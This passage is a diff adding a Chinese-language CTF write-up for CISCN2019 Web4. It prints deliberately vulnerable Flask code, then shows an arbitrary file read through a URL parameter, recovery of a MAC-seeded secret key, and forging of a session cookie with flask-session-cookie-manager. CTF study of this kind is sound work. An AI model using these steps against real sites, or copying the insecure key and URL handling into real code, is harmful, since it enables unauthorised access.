@@ -3936,6 +3936,101 @@ if (isset($_GET['get_flag'])){
         python flask_session_cookie_manager3.py encode -s "176a7e21b5534065943ddf7a0af35eeb*abcdefgh" -t "{'admin':1}"
     ```
 
+## CISCN2019 华东南赛区 Web4(flask session 伪造)
+
+1. 源码
+
+    ```python
+    # encoding:utf-8
+    import random
+    import re
+    import urllib
+    import uuid
+
+    from flask import Flask, session, request
+
+    app = Flask(__name__)
+    random.seed(uuid.getnode())
+    app.config['SECRET_KEY'] = str(random.random() * 233)
+    app.debug = True
+
+
+    @app.route('/')
+    def index():
+        session['username'] = 'www-data'
+        return 'Hello World! Read somethings'
+
+
+    @app.route('/read')
+    def read():
+        try:
+            url = request.args.get('url')
+            m = re.findall('^file.*', url, re.IGNORECASE)
+            n = re.findall('flag', url, re.IGNORECASE)
+
+            if m or n:
+                return 'No Hack'
+
+            res = urllib.urlopen(url)
+            return res.read()
+        except Exception as ex:
+            print str(ex)
+            return 'no response'
+
+
+    @app.route('/flag')
+    def flag():
+        if session and session['username'] == 'fuck':
+            return open('/flag.txt').read()
+        else:
+            return 'Access denied'
+
+
+    if __name__ == '__main__':
+        app.run(debug=True, host="0.0.0.0")
+    ```
+
+2. 看到了一个url参数，测试发现可以读取文件，试了一下php文件发现读不出来，扫描目录后发现了console页面，猜到flask的debug。
+
+读取源码：/app/app.py
+
+发现是session伪造，密钥生成方法
+```python
+random.seed(uuid.getnode())
+app.config['SECRET_KEY'] = str(random.random() * 233)
+```
+
+这里的seed使用的uuid.getnode()的值，该函数用于获取Mac地址并将其转换为整数。
+
+对于伪随机数，如果seed固定，则随机数就会变成常数。
+
+读取Mac地址`url=/sys/class/net/eth0/address`
+
+用python2得出密钥。(Python2和Python3保留的位数不一样)
+
+```python
+>>> import random
+>>> random.seed(0xe657d6d45b86)      
+>>> print( str(random.random() * 233)) 
+206.771423336
+```
+
+然后利用Flask-Session脚本解密
+
+```cmd
+F:\ProgramFiles\ctf\flask-session-cookie-manager>python flask_session_cookie_manager3.py decode -s 206.771423336 -c eyJ1
+c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Zkn0QA.xWH-5EUwjzyBQf8AJ1H6J8OloeE
+{'username': b'www-data'}
+```
+
+将www-data替换成fuck
+
+```cmd
+F:\ProgramFiles\ctf\flask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s 206.771423336 -t "{'username': b'fuck'}"
+eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.Zkn-mw.JhCeSGzt7rYVIh8JqNHYjpzJ078
+```
+拿到session。用session去访问/flag。
+
 ## SWPU2019 web(无列名注入+mysql.innodb_tabel_stats爆表名)
 
 - 考点
